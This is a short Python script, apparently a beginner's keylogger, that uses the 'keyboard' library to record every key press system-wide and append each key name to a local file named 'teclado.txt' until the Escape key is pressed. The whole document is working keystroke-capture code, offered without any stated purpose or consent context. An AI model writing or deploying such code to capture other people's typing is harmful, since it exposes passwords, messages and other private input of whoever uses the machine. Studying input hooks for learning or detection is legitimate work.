import keyboard
with open("teclado.txt", "a") as archivo:
    def entrar(event):
        archivo.write(event.name + "\n")

    keyboard.on_press(entrar)
    keyboard.wait("esc")
